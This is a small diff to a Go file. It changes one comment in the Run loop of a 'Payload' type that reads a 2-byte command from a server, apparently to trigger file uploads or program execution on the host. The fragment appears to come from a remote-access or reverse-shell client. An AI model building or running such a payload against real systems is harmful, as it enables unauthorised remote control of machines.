@@ -34,7 +34,7 @@ func (p *Payload) Run() {
 	p.Conn = conn
 
 	for {
-		// commandByteBuffer is the firt byte being sent by the server
+		// commandByteBuffer is the firt 2 bytes being sent by the server
 		// we grab this to check if the server is sending over any special commands
 		// to upload a file or execute a program
 		commandByteBuffer := make([]byte, 2)
